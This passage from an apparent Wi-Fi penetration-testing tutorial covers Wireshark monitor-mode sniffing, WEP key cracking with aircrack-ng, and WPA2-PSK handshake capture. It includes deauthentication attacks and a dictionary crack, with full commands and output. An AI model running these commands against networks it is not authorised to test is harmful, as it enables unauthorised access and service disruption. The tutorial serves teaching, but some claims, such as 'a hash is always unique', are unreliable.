+Run the  autogen.sh  script to configure your build directory:  
+./autogen.sh   
+ 
+Run the  configure  script. It checks your Linux system to ensure it has the proper library 
+dependencies, i n addition to the proper compiler to compile the source code.  
+./configure --enable-setcap-install 
+ 
+To b uild and install Wireshark , type  
+
+ 
+40 make   #Build packages   
+make install   #Install binaries on system  
+ 
+Run Wireshark,  
+wireshark &  
+ 
+or simply press Alt+F2 and enter  Wireshark . 
+Hit Ok, if it shows an error and continue.  
+ 
+As you know that Wireshark can capture traffic from ethernet, USB, Wi-Fi (when 
+authenticated ), or Wi-Fi (in monitor mode ). 
+You can select any interface  (ethernet, USB or Wi -Fi) and s tart captu ring traffic from it . But , 
+keeping  the scope of this book  in mind, we  have  a Wireless card and haven’t yet connected 
+or penetrated to any network. So, it leaves us with  no option but  sniffing the air and that is 
+possible only by putting the wireless card in monitor mode . 
+ 
+Monitor mode  
+First thing first! Kill processes that could cause trouble.  
+airmon-ng check kill  
+ 
+Killing these processes:  
+ 
+   PID Name  
+  3694 wpa_supplicant  
+  3697 dhclient  
+  3711 avahi -daemon-ch 
+ 
+To put  card in monitor mode, first find wireless interface name.  
+Type iwconfig  in terminal and check the wireless interface  name , wlan0 in this case  
+ 
+lo        no wireless extensions.  
+eth0      no wireless extensions.  
+wlan0     IEEE 802.11  ESSID:off/any   
+          Mode:Managed  Access Point: Not -Associated   Tx -Power=20 dBm    
+          Retry short limit:7   RTS thr:off   Fragment thr:off  
+          Encryption key:off  
+          Power Management:off  
+ 
+Mode:Managed , see line 4. To enable monitor mode, Enter  
+airmon-ng start wlan 0 
+PHY Interface  Driver  Chipset 
+ 
+phy3 wlan0  rt2800usb  Ralink Technology, Corp. RT2870/RT3070  
+ 
+  (mac80211 monitor mode vif enabled for [phy3]wlan0 on [phy3] wlan0mon) 
+  (mac80211 station mode vif disabled for [phy3]wlan0)  
+ 
+Type ifconfig  to check the new  monitor mode interface . wlan 0mon  in this case . Yours  could 
+
+ 
+41 be different , like wlan1mon , wlan2mon  etc. 
+wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500  
+        unspec 00 -C0-CA-5A-34-B6-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)  
+        RX packets 5  bytes 1189 (1.1 KiB)  
+        RX errors 0  dropped 5  overruns 0  frame 0  
+        TX packets 0  bytes 0 (0.0 B)  
+        TX errors 0  dropped 0 ove rruns 0  carrier 0  collisions 0  
+ 
+Card is finally i n monitor mode.  Let’s  sniff the air  with Wireshark!  
+ 
+Select Sniffing Interface  
+As soon as you enable monitor mode, wlan0mon will appear on Wireshark’s list of 
+interfaces. Y ou will also see a real -time graphical  representation of traffic received by an 
+interface.  
+ 
+Double -click wlan0mon to enter live -view window . Packets  displayed  in real -time  with a 
+high level ordered precision. Notice the decimal value of Time column below. Yes, to the 9th 
+place! Which me ans Wireshark will maintain perfect packet order even with two packets 
+with 1 nanosecond difference. See the power? You better bow down to the devs for this.  
+
+
+ 
+42 Stop sniffing  
+Click on red button  on the top left corner of the window when you want to stop.  
+ 
+Filters and Packet Analysis  
+Numerous packets are captured in a very short span of time . Especially when the card is in 
+monitor mode, it makes packet analysis  difficult.  
+One day or another you’ll feel a dire need to filter the output, reduce the clutter and m ake it 
+easier to analyse . It contains a variety of filters. I’ll show  some of them in this segment so 
+that you  understand how filters work and make life easier.  
+Wireshark has 2 types of filters, see text -input column in last 2 images  
+1. Display filter  
+2. Capture  filter  
+ 
+Display filters   
+You can apply display filters, when you w ant to look for specific data . The packets, that don't 
+match the Display Filter are hidden, but no t removed from the original capture file.  
+ 
+There are different ways to apply display filte rs. 
+A way to use display filters is to start typing in the (Green bar) Filter Input Field.  
+You can take advantage of the autoc omplete function. When the back ground of the filter  
+box turns green from red, it means filter string is valid.  
+Don't forget to hit  Apply or [Enter ] to apply the filter.  
+  
+
+
+ 
+43 You can also copy and paste filter strings into the Filter Input Field.  
+Here are some examples:  
+Filter Type  Display Filter command  
+Show only beacon frames  wlan.fc.type_subtype == 0x08  
+Show ever ything except 
+beacon frames !wlan.fc.type_subtype == 0x08  
+ 
+Show only beacon frames 
+and acknowledgement frames  (wlan.fc.type_subtype == 0x08) || (wlan.fc.type_subtype == 
+0x1d)  
+Show everything except the 
+beacon and ack frames  (!wlan.fc.type_subtype == 0x08) && (!wlan.fc.type _subtype == 
+0x1d) 
+ 
+A complete list of 802.11 display filter fields can be found in the  wlan , wlan_mgt , 
+and wlan_aggregate  display filter references.  
+ 
+Capture Filters  
+When you use a capture filter only the packets that match the filter are dumped  to a file. 
+This will reduce the amount of data to be captur ed. 
+ 
+Capture filters have a different syntax than display filters.  
+ 
+You enter the capture filters into the Filter field of the Wireshark Capture Options dialog box 
+and hit the Start button.  
+ 
+Here are some examples:  
+Filter Type  Capture Filter Command  
+Capture only beacon frames  wlan[0] == 0x80  
+Capture everything except beacon frames  wlan[0] != 0x80  
+Capture only beacon frames & ack frames  wlan[0] == 0xd4  
+Capture everythi ng except beacon frames 
+and ack frames: wlan[0] != 0x80 and wlan[0] != 0xd4  
+ 
+Capture f ilter is not a display filter  
+Capture filters (like  tcp port  80) are not to be confused with display filters 
+(like  tcp.port  == 80). The former is much more limited and are used to reduce the size of a 
+raw packet capture. The latter are used to hide some pa ckets from the packet list.  
+Capture filters are set before starting a packet capture and cannot be modified during the 
+capture. Display filters on the other hand do not have this limitation and you can change 
+them on the fly.  
+In the main window, one can fi nd the capture filter just above the interfaces list and in the 
+interfaces dialog.  
+The display filter can be changed above the pac ket list as can be seen in this image:  
+
+ 
+44  
+We will use Display filter for now,  
+Filter packets with a specific SSID. In this  example, “ dlink ” is the SSID we will filter  
+ 
+In the above screenshot we have entered the filter in the green box i.e  ‘wlan_mgt.ssid = = 
+“dlink ” ‘ 
+All the packet di splayed have a common element which is the SSID name: dlink  which was 
+being broadcasted in the air.  Replace dlink  with your desired SSID.  
+Wireshark capture all sorts of packets and you might think of filtering packets with specific 
+MAC address  during pente st. 
+In next example,  we will filter all the packets broadcast ed by any AP . Broadcast packets have 
+destination MAC address as “ FF:FF:FF:FF:FF:FF ”. You can see this in the previous image  also. 
+ 
+
+
+ 
+45 wlan.addr == FF:FF:FF:FF:FF:FF  has a syntax just like the Java language, Here  wlan  is the 
+package and addr, which is hardware address, is the class defined in the  wlan  package.  
+Save packets  
+When you get your desired packets  filtered it’s time to save them for analysing  in future.  
+● Go to  File.  
+● Click on  Save.  
+● Browse location, input Filename and press [ Enter ] 
+ 
+Next time you start Wireshark  and want to analyse  previously saved packets  
+Go to File > Open . Browse the p cap file. Do w hatever you want.  
+Colour  coding  
+You would have noticed that all the frames captured were being displayed in black/white. 
+That is not it. Wireshark display packets in colours . 
+In the above examples,  the packets were broadcast packets and Wireshark  don’t app ly any 
+colour  coding to the broadcast packets.  
+By default, green is TCP traffic, dark blue is DNS traffic, light blue is UDP traffic, and black 
+identifies TCP packets with problems.  
+For example,  applying a filter “ dns” (When connected to the Internet) we see an output of 
+packets, all highlighted with dark blue colour . 
+ 
+DNS  requests propagates through port 53 , like port 21 for FTP, 22 for SSH and 80 for HTTP  
+Conclusion  
+We now have our hands -on Wireshark  and had a glimpse of using Wireshark  filters to 
+reduc e the clutter. We will learn more about Wireshark  and its filters along the series.  
+Next,  we will see how to crack WEP using aircrack -ng suite of tools and inspect the captured 
+pcap file using Wireshark . 
+
+
+ 
+46 WEP cracking using Aircrack -ng 
+WEP ( Wired Equivalent  Privacy) is the weakest and an outdated encryption mechanism used 
+by the routers  (access points) to encrypt data packets passing through the router itself.  
+ 
+WEP uses 64 -bit and 128 -bit encryption as a standard, but security researchers discovered 
+many fla ws in  the encryption mechanism of We , like static key generation, fast re -keying 
+method. Many vulnerabilities were discovered and many attacks were designed accordingly.  
+Attacks like  
+● Korek’s Chop -Chop Attack, By Korek  
+● Caffe Latte attack, By  Vivek Ramachandran  
+● Fragmentation attack  
+● Hirte attack, an extension to Caffe -Latte attack  
+Overview  
+WEP has been broken in so many different ways that, regardless of the encryption size i.e . 
+64-bit or 128 -bit or 152 -bit or th e complexity and length of your key, your password for WEP 
+encrypted AP is bound to be broken. All it takes is a significant number of IVs (Initialization 
+Vectors), or in simple terms Data Packets that will be used to decrypt the captured traffic 
+and recov er the key.  
+ 
+WEP is outdated now, we have better fixes for that. WPA2, WPS enabled routers, which by 
+far are unbroken at this moment in terms of encryption mechanism. Although keys can be 
+recovered in case of WPA2 and WPS also , that we will study in  upcomi ng chapter.  
+you might be thinking that,  
+ 
+Why are we studying WEP Cracking when it is outdated ? 
+Reason  is, it is necessary to learn and understand WEP cracking mechanism, as  
+• Necessary to learn where it all began.  
+• It is easy to understand when you start smal l. Big ger won’ t be a mess.  
+• You’ll still find many APs nearby using WEP as default encryption schema . 
+ 
+Let’s Begin,  
+ 
+Step 1 : 
+Plug -in your wireless card and fire up your Kali Terminal and enter airmon -ng to check that 
+your wireless interface is detected by t he airmon -ng utility.  
+We will use Wlan 0 i.e. our Alfa card, in this tutorial  
+ 
+ 
+ 
+ 
+ 
+
+ 
+47 Step 2 : 
+Run airmon -ng check  kill in terminal to all troublesome programs . 
+ 
+Killing these processes:  
+ 
+   PID Name  
+  3694 wpa_supplicant  
+  3697 dhclient  
+  3711 avahi -daemon-ch 
+ 
+Always r un airmon -ng check kill  before putting wireless card on monitor mode.  
+ 
+You can also kill these processes manually , we will discuss that a bit later.  
+ 
+Step 3: 
+Put Alfa card( wlan 0) in monitor mode.  
+ 
+airmon-ng start wlan0  
+ 
+PHY Interface  Driver  Chipset 
+ 
+phy1 wlan0  rt2800usb  Ralink Technology, Corp. RT2870/RT3070  
+ 
+  (mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1] wlan0mon ) 
+  (mac80211 station mode vif disabled for [phy1]wlan0)  
+ 
+Alfa card is now in monitor mode  (wlan0mon ), time to scan the  air. For that , we will use 
+airodump -ng from the aircrack -ng suite of tools.  
+ 
+Step 4: 
+Run airodump -ng [monitor mode interface]  and Identify the WEP enabled AP.  
+airodump -ng wlan0mon 
+CH  1 ][ Elapsed: 3 s ][ 2017 -07-12 22:12                                          
+ 
+BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID  
+ 
+64:66:B3: 6E:B0:8A  -42  79      4 36      455    1   1  54e. WEP  WEP    OPN  rootsh3ll   
+54:B8:0A:8E:36:00  -73   0      138        0    0   1  54e  WEP  WEP         abhinav 
+ 
+BSSID              STATION            PWR   Rate    Lost    Frames  Probe               
+                      
+64:66:B3:6E:B0:8A  2C:33:61: 2D:C6:3G  -46   54e -24      0      8  rootsh3ll           
+64:66:B3:6E:B0:8A  00:71:E2:E E:A3:E8  -60    0 - 1e     0      4   rootsh3ll           
+ 
+rootsh3ll  is the ESSID, and MAC addresses highlighted in RED are the devices associated with 
+router with MAC  64:66:B3:6E:B0:8A   
+After identifying WEP enabled AP, hit CTRL -C and note the  following information:  
+ 
+BSSID  (AP MAC ):   64:66:B3:6E:B0:8A  
+ESSID  (AP Name ):  rootsh3ll  
+
+ 
+48 Channel  (CH):   1 
+Station  (STA):   84:38:38:16:c6:b8  
+  
+We will use this  information according to the scenario. It can also be used  to reduce the 
+.pcap file size by capturing data from this AP exclusiv ely. This can be done with airodump -
+ng, easily.  
+ 
+Step 5:  
+Specify the BSSID , channel number  to airodump -ng for exclusive data capture  and save to a 
+file so that we can used the dump file to crack the WEP passphrase.  
+ 
+airodump -ng --bssid 64:66:B3:6E:B0:8A -c 1 -w rootsh3ll  wlan0mon 
+CH  1 ][ Elapsed: 19 s ][ 2017 -07-12 22:12                                          
+ 
+BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID  
+ 
+64:66:B3: 6E:B0:8A  -42  79     9036     1 550    1   1  54e. W EP  WEP    OPN  rootsh3ll  
+54:B8:0A:8E:36:00  -73   0      138        0    0   1  54e  WEP  WEP         abhinavtsj  
+ 
+BSSID              STATION            PWR   Rate    Lost    Frames  Probe               
+                      
+64:66:B3:6E:B0:8A  2C:33:61:2D :C6:3G  -46   54e -24      0      832  rootsh3ll           
+64:66:B3:6E:B0:8A  00:71:E2:EE:A3:E8  -60    0 - 1e     0      834  rootsh3ll           
+ 
+Command Breakdown : 
+--bssid :  Access point MAC address  
+-c:   APs operating Channel number, see upper right cor ner denoting CH. No.  
+-w:   Output filename, put any  name you want  
+ 
+Notice #Data  section of the output. This is the data  (in bytes)  captured from the AP  
+rootsh3ll .  
+In case of WEP  base APs , #Data  is the IVs that will be used to decrypt the key.  
+Remember, mo re the Data packets, easier to crack WEP.  
+ 
+CH  1 ][ Elapsed: 30 s ][ 2017 -07-12 22:13  
+ 
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID  
+                                                                                         
+ 64:66:B3:6E:B0:8A  -62  79    18092      3505    1   1  54e. WEP  WEP    OPN  rootsh3ll  
+ 54:B8:0A:8E:36:00  -73   0      1 92        0    0   1  54e  WEP  WEP         abhinavtsj  
+                                                                                         
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe               
+                                                                                         
+ 64:66:B3:6E:B0:8A  2C:33:61:2D:C6:3G   -46   54e -24      0     1768  rootsh3ll           
+ 64:66:B3:6E:B0:8A  00:71:E2:EA:A0:E8  -60    0 - 1e     0      983  rootsh3ll           
+ 
+Now here’s a catch. Notice the d ata packets, only 3505. To start the cracking process,  you 
+must have at least  5000  IVs as the easiest passw ord of 5 -digit like 11111, 12345 can be 
+cracked with such low no. of IVs or Data packets.  
+But that’s not an issue. Airodump -ng runs endlessly and will keep on capturing the data 
+
+ 
+49 whilst we will start cracking in a new terminal.  
+ 
+ 
+Step 6: 
+Run aircrack -ng [a irodump -ng output filename].cap  and wait for the key to appear.  
+ 
+aircrack -ng rootsh3ll -01.cap  
+Aircrack -ng 1.2 rc4  
+ 
+[00:00:07] Tested 134401 keys (got 25663 IVs)  
+ 
+KB   depth   byte(vote)  
+ 0   56/ 57  DA(27904) 2F(27648) 43(27648) 67(27648) 7C(27648) 81(2764 8) A1(27648) AF(27648) B8(27648)  
+ 1   24/  1  D8(29696) 06(29440) 29(29440) 33(29440) B1(29440) 03(29184) FC(29184) 26(28928) BC(28928)  
+ 2   13/ 47  FB(29952) 27(29696) 48(29696) AB(29696) D4(29696) 49(29440) 64(29440) 6E(29440) C0(29440)  
+ 3   13/  3  E3(29952) 32(29696) 61(29696) 89(29696) 06(29440) D3(29440) E8(29440) 12(29184) 31(29184)  
+ 4    0/  3  C9(39424) 1C(33024) DB(33024) D8(32768) 01(32256) B2(31232) 02(30976) 1A(30976) C7(30976)  
+ 
+Failed. Next try with 30000 IVs.  
+ 
+Fortunately,  aircrack -ng al so cracks in an endless process, so no need to enter commands 
+again and again.  
+As you can see in the above image aircrack -ng got 25,663 IVs but didn’t succeed and waiting 
+for #data  to be written to cap file and try again on 30,000 IVs.  
+After a significant no. of #Data packets are captured and dumped, aircrack -ng will display 
+the password with a similar output  
+ 
+ 
+Aircrack -ng 1.2 rc4  
+ 
+ 
+[00:00:01] Tested 1192814 keys (got 169452 IVs)  
+ 
+KB    depth   byte(vote)  
+ 0    0/  1   69(229376) 13(184320) 4E(183808) 17(18 3296) D0(183040) 6B(182528) F3(182528)  
+ 1    0/  1   61(241408) 52(186368) B8(185088) 44(184320) 6A(183552) 79(182528) 9F(182528)  
+ 2    0/  1   6D(228096) 59(186624) 08(185344) 81(184320) 0B(183040) 4B(182528) 58(181248)  
+ 3    0/  1   20(224000) 33(1856 00) 64(185600) 19(185088) 1A(183552) E1(182528) 63(182016)  
+ 4    0/  1   72(241408) 01(188928) 1F(186112) E9(184576) 4F(183296) 7E(183296) 9B(182016)  
+ 5    0/  1   6F(230912) EF(185088) 58(184832) 4B(184320) 51(183552) 4A(183296) E2(183040)  
+ 6    0/  2   6F(194816) 2E(189184) 0B(184064) 5F(183808) B9(183552) A1(183296) E8(182784)  
+ 7    0/  1   74(241152) 4F(188928) 91(188928) 9E(188416) DD(186880) 60(186368) 53(184320)  
+ 8    0/  1   73(216832) FD(186624) 79(185856) 64(184576) 30(184320) 09(183296) B6(1 83296)  
+ 9    0/  1   68(212224) 74(186880) 3D(186624) EE(185856) FE(184064) 6E(183552) EB(182784)  
+10    0/  1   EE(189184) EF(186112) 15(185856) 0E(185344) DF(185344) 39(184832) 44(183808)  
+11    0/  1   46(186112) EA(185088) C2(183808) 41(183040) FE(183 040) 66(182528) DF(182528)  
+12    2/ 10   72(186776) 4E(182772) B7(182756) 17(181852) E5(181788) 48(181096) 97(180956)  
+ 
+       KEY FOUND! [ 69:61:6D:20:72:6F:6F:74:73:68:33:6C:6C ] (ASCII: iam rootsh3ll ) 
+  Decrypted correctly: 100%  
+ 
+This is the ideal way  of cracking a WEP enabled network key.  
+ 
+ 
+
+ 
+50 Factors affecting #Data  captured amount : 
+1. User connecting/Disconnecting, SLOW  
+2. Surfing/D ownloading across  network, FASTEST ( takes seconds for 20-40K #Data ) 
+ 
+It is being called ideal because just at any point it is no t sure that a user is downloading, 
+connecting, browsing or even connected to the network.  
+Then what ? 
+Here come  the attacks described above to push the #Data to the limits and get us the IVs 
+quickly. We will learn about them later in this book.  
+Now, to pay what was due  
+ 
+Another way to fix the “Monitor mode” error in Kali 
+Linux  
+From airmon -ng check, we know the troublesome processes. Simply stop them via terminal  
+Kill the network manager,  
+1. Open  Terminal  
+2. Run service network -manager  stop  
+3. Do the same with wpa_sup plicant  and dhclient  
+ 
+After you are done with the pentesting and want to connect to a network, you’d want to 
+restart the network manager.  
+Start/Restart network manager  
+1. Open terminal  
+2. Run service network -manager  start  
+3. Do the same with wpa_supplicant  and dhclient 
+ 
+Even if you killed the processes using  airmon -ng check kill  command, you can still use the 
+above command to start the network manager and connect to Wi-Fi. 
+  
+
+ 
+51 WPA2 -Personal cracking [aircrack -ng] 
+Under certain circumstances it’s too easy to crack WEP,  which leads  us to an obvious 
+question   
+How to secure it? use WPA2 -PSK.  
+ 
+What is WPA2 -PSK?  
+WPA2 -PSK, Wi-Fi Protected Access  - Pre-Shared  Key, is by far one of the most secure and 
+unbroken wireless security encryption algorithm at this moment. There is no e ncryption 
+flaw yet reported by security researchers for WPA2, so that a malicious hacker can easily 
+take advantage of and easily decrypt  data  packets.  
+ 
+Encryption might be the most secured and unbroken at this point, but WPA2 system is still 
+pretty vulnera ble to the hackers.  
+Unlike WEP, WPA2 uses a 4 -way handshake as an authentication process.  
+ 
+4-Way handshake  
+The four -way handshake is designed so that the access point (or authenticator) and wireless 
+client (or supplicant) can independently prove to each o ther that they know the PSK/PMK  
+(Pairwise Master Key ), without ever disclosing the key. Instead of disclosing the key, the 
+access point & client each encrypt messages to each other  that can only be decrypted by 
+using the PMK that they already share  and if decryption of the messages was successful, this 
+proves knowledge of the PMK.  
+The four -way handshake is critical for protection of the P MK from malicious access points - 
+for example, an attacker's SSID im personating a real access point - so that the client  never 
+has to tell the access point its PMK.  
+Both WPA2 -PSK and WPA2 -EAP result in a Pairwise Master Key  (PMK) known to both the supplicant 
+(client) and the authenticator (AP). ( In PSK the PMK is derived directly from the password, whereas in 
+EAP it is a re sult of the authentication process ) 
+ 
+The PMK is designed to last the entire session and should be exposed as little as possible; 
+therefore,  keys  to encrypt the traffic  need to be derived. A four -way handshake is used to 
+establish another key called the Pairwise Transient Key (PTK).  
+The PTK is generated by concatenating  the following attribut es: PMK, AP  nonce  (ANonce), 
+STA nonce  (SNonce), AP MAC address , and STA MAC address.  
+The product is then put through a  pseudo rando m function . The handshake also yields the 
+GTK (Group  Temporal Key), used to decrypt multicast  and broadcast traffic.  
+  
+
+ 
+52 The actual messages exchanged during the handshake are depicted in the figure and 
+explained below (all messages are sent as  EAPOL -Key frames):  
+ 
+1. The AP sends a nonce -value to the STA (ANonce). The client now has all the 
+attributes to construct the PTK.  
+2. The STA sends it s own nonce -value (SNonce) to the AP together with a  Message  
+Integrity Code (MIC), including authentication, which is really a Message 
+Authentication and Integr ity Code (MAIC).  
+3. The AP constructs and sends the GTK and a sequence number together with another 
+MIC. This sequence number will be used in the next multicast or broadcast frame, so 
+that the receiving STA can perform basic replay detection.  
+4. The STA sends a confirmation to the AP.  
+ 
+Just like the broadcast packets we sa w in the previous chapter using,  the 4 -way handshake 
+is also in plain text . 
+Which allows a potential hacker to capture the plaintext information like  
+• Access point MAC address  
+• Client MAC address  
+• ESSID AP Name  
+ 
+Information above is used by the hacker to perform a dictionary attack on the captured 4 -
+way handshake (PCAP File). Let’s see  
+ 
+• What is a dictionary attack?  
+• How to perform a dictionary attack on WPA2 -PSK?  
+  
+
+
+ 
+53 What is a dictionary attack ? 
+Hashin g is one of the keys used in the security field by the professional to protect the users 
+from the malicious attackers.  
+A hash is simply a cryptographic function that converts a data or file of an arbitrary length / 
+size to a fixed length.  Unlike encryption,  it is practically impossible to invert or reverse , as no 
+key is involved in the process.  
+Encrypted and encoded data can be decrypted and decoded respectively, but there is no 
+such thing as de -hashing. And a hash is always unique.  
+ 
+In a dictionary attack,  
+1. We create/use a wordlist (text file of possible passwords)  
+2. Take one word at a moment from the wordlist  
+3. Create its hash using the Hash function, PBKDF2 for WPA2  
+4. Compare the output value with the existing hash.  
+5. If value matches, password taken from the wordl ist is the correct password  
+Above steps are involved in the WPA2 passphrase cracking process.  
+Let’s begin,  
+ 
+Step 1  
+Start monitor mode  
+ifconfig wlan0               #Check whether card is detected  
+airmon-ng check kill    #Kill process causing issues  
+airmon-ng start wlan 0    #Start monitor mode  
+Final output should look like this:  
+root@rs:~# ifconfig wlan0         
+wlan0: flags=4098<BROADCAST,MULTICAST>  mtu 1500  
+        ether 00:c0:ca:5a:34:b6  txqueuelen 1000  (Ethernet)  
+        RX packets 0  bytes 0 (0.0 B)  
+        RX errors 0  dropped 0  overruns 0  frame 0  
+        TX packets 0  bytes 0 (0.0 B)  
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  
+ 
+root@rs:~# airmon-ng check kill    
+Killing these processes:  
+   PID  Name  
+   762  wpa_supplicant  
+ 
+root@rs:~# airmon-ng start wlan0   
+ 
+ 
+PHY Interface  Driver  Chipset 
+ 
+phy1 wlan0  rt2800usb  Ralink Technology, Corp. RT2870/RT3070  
+ 
+  (mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1] wlan0mon ) 
+  (mac80211 station mode vif disabled for [phy1]wlan0)  
+ 
+Step  2:  
+Start capture, airodump -ng 
+We will now start airodump -ng to sniff the air and wait until the desired AP and 
+
+ 
+54 corresponding client are displayed.  
+ 
+airodump -ng wlan0mon 
+CH 13 ][ Elapsed: 1 min ][ 2017 -07-13 01:46  
+ 
+BSSID              PWR  Beacons    #Data , #/s  CH  MB   ENC  CIPHER AUTH ESSID 
+ 
+64:66:B3:6E:B0:8A  -46       20        1    0  11  54e. WPA2 CCMP   PSK  rootsh3ll  
+D8:FE:E3:7B:40:A0  -64       15      388    0   1  54e. WPA  CCMP   PSK  Ravi  
+6C:19:8F:B9:82:B6  -76        9        0    0   1  54e. WPA2 CCMP   PSK  dlink  
+54:B8:0A:8E:36:00  -78       16        6    0   1  54e  WEP  WEP         abhinav  
+ 
+BSSID              STATION            PWR   Rate    Lost    Frames  Probe  
+ 
+64:66:B3:6E:B0:8A   2C:33:61:3A:C4:2F    -1    1e- 0      0        1  
+D8:FE:E3:7B:40:A0  50:8F:4C:A0:4D:21   -1    5e- 0      0      388  
+54:B8:0A:8E:36:00  34:31:11:41:60:2A   -1    1e- 0      0        8  
+ 
+As you can see in the above image, “ rootsh3ll ” is the victim AP. We will now note the 
+information highlighted  
+AP (ESSID ):   rootsh3ll  
+AP MAC  (BSSID ):   64:66:B3:6E:B0:8A  
+Client MAC :   2C:33:61:3A:C4:2F  
+Channel :   11 
+ 
+Hit CTRL -C, and kill airodump -ng. 
+Then restart  airodump -ng exclusively to capture packets associated with “rootsh3ll” and 
+save the 4 -way handshake in a PCAP file, say  rootsh3ll  
+ 
+Step 3 : 
+Start airodump -ng, exclusively . 
+ 
+airodump -ng --bssid 64:66:B3:6E:B0:8A -c 11 wlan 0mon -w rootsh3ll  
+CH 11 ][ Elapsed: 12 s ][ 2017 -07-13 01:56                                          
+                                                                                       
+BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID  
+                                                                                       
+64:66:B3:6E:B0:8A  -47 100      119       13    2  1 1  54e. WPA2 CCMP   PSK  rootsh3ll  
+                                                                                       
+BSSID              STATION            PWR   Rate    Lost    Frames  Probe              
+                                                                                       
+64:66:B3:6E:B0:8A  2C:33:61:3A:C4:2F   -24    0 -24     30       46                     
+ 
+Here “ rootsh3ll ” is the output filename provided to the  -w parameter  
+ 
+Step 4 : Disconnect the client with aireplay -ng. 
+ 
+Capturing  a handshake is possible in 2 ways,  
+1. Wait for a client to connect.  
+2. Disconnect the already connected client.  
+ 
+
+ 
+55 Waiting for a client to connect could be a  time -consuming  process . Whether in our case, 
+option 2 is just perfect as we have a client connected to th e wireless AP “rootsh3ll”.  
+How does that work?  we use a tool from the  aircrack -ng suite, aireplay -ng, which allows us 
+to craft and send  a de-authenticate  request to the desired AP with the information we 
+noted down earlier.  
+We are actually abusing a legiti mate Windows ( or any other OS) feature. Which forces the 
+wireless card to re -connect to the AP when available.  
+In the second option we are actually making sure that option 1 happens, so that we can 
+capture the handshake.  
+1. Client disconnects from AP when dea uth packet  is received . 
+2. Reconnect to the AP  (of higher signal strength)  
+3. 4-way handshake happens between AP and client  
+4. Hacker  (airodump -ng) captures the 4 -way handshake . 
+ 
+let’s disconnect the client now,  
+aireplay -ng --deauth 5 -a 64:66:B3:6E:B0:8A wlan 0mon 
+02:00:58  Waiting for beacon frame (BSSID: 64:66:B3:6E:B0:8A) on channel 11  
+NB: this attack is more effective when targeting  
+a connected wireless client ( -c <client's mac>).  
+02:00:59  Sending DeAuth to broadcast -- BSSID: [64:66:B3:6E:B0:8A]  
+02:00:59  Send ing DeAuth to broadcast -- BSSID: [64:66:B3:6E:B0:8A]  
+02:01:00  Sending DeAuth to broadcast -- BSSID: [64:66:B3:6E:B0:8A]  
+02:01:00  Sending DeAuth to broadcast -- BSSID: [64:66:B3:6E:B0:8A]  
+02:01:01  Sending DeAuth to broadcast -- BSSID: [64:66:B3:6E:B0:8A ] 
+ 
+Command Breakdown : 
+--deauth 5 :  5 deauth requests broadcasted with BSSID “rootsh3ll”, 0 for endless  
+-a:   Parameter to tell aireplay -ng the BSSID  
+wlan0mon :  Monitor mode interface  
+ 
+Step 5 :  
+Capture the handshake  
+Meanwhile , On the top right of airodump -ng output window, you’d notice something like:  
+WPA Handshake: 64:66:B3:6E:B0:8A  
+ 
+CH 11 ][ Elapsed: 36 s ][ 2017 -07-13 02:01 ][ WPA handshake: 64:66:B3:6E:B0:8A         
+                                                                                       
+BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID  
+                                                                                       
+64:66:B3:6E:B0:8A  -46 100      357       43    0  11  54e. WPA2 CCMP   PSK  rootsh3ll  
+                                                                                       
+BSSID              STATION            PWR   Rate    Lost    Frames  Probe              
+                                                                                       
+64:66:B3:6E:B0:8A  2C:33:61:3A:C4:2F   -22    1e -24      0       76                     
+ 
+Which simply means that the WPA handshake has been capture for the specific BSSID.  
+ 
+Hit CTRL -C, as the handshake has been captured, we will now crack the password u sing the 
+captured handshake  
+
+ 
+56  
+Step 6 : Handshake inspection  
+ 
+How does a Handshake look  like? Open Wireshark ( Optional ) 
+This step is optional, you can open the PCAP file(rootsh3ll -01.cap) in Wireshark for manual 
+inspection, or to see how does a handshake look s like.  
+ 
+Syntax: Wireshark  [.cap file ], which in our case is  
+wireshark  rootsh3ll -01.cap 
+ 
+Type eapol  in the display filter field , hit [ENTER]  to apply filter.  
+You would notice the last column, “ Info” is showing a message no. from 1 to 4.  
+ 
+This is the 4-way handshake happened during the capture. It is AP and Client talking to each 
+other. Notice the Source  and Destination  tab. 
+ 
+moving on to the next step,  
+ 
+Step 7 : An ugly truth of Cracking  
+ 
+“Once you grab the handshake, your chances to crack the key are as go od as your wordlist ” 
+-A legit WiFi hacker  
+ 
+WPA2 password cracking is not deterministic like WEP, because it is based on a dictionary of 
+possible words and we do not know whether the passphrase is in the wordlist  or not. So, 
+you are never sure whether a sp ecific dictionary  would  work or not.  
+For this tutorial,  I have a beautifully crafted wordlist,  like seriously, it’s a piece of art! just to 
+demonstrate how the output of the cracked password would look like.  
+ 
+Command and the wordlist looks like this:  
+echo “iamrootsh3ll” > dict  
+cat dict  
+iamrootsh3ll  
+ 
+Here I have directly saved the password in the wordlist to demonstrate how the output 
+would look like, your s would  be different, obviously.  
+Fire up aircrack -ng and crack the key  
+Command Syntax: aircrack -ng [.cap file ] -w [path /to/wordlist ], which in our case looks like : 
+ 
+
+
+ 
+57 aircrack -ng rootsh3ll -01.cap -w ./dict 
+Dot “.” Stands for current directory, and forward slash “ /” means inside the directory (not 
+file). Which explains that “./dict” means a file named dict is inside  (/) of current -directory  (.) 
+ 
+aircrack -ng has cracked the password in one go.  
+ 
+This is quite odd to see the cracked passphrase for the first time, right?  
+Here’s a sample output of the running process, yours would look like the same during the 
+cracki ng process.  
+ 
+                                 Aircrack -ng 1.2 rc4  
+ 
+      [00:00:00] 1/0 keys tested (47.56 k/s)  
+ 
+      Time left: 0 seconds                                   inf%  
+ 
+                         KEY FOUND! [ iamrootsh3ll ] 
+ 
+ 
+      Master Key     : 1F 4B 02 FE 4C 82 F4 E0 26 2E 60 97 E7 BA D1 F1  
+                       92 83 B6 68 7F 08 4F 73 33 1D B8 6C 62 49 8B 40  
+ 
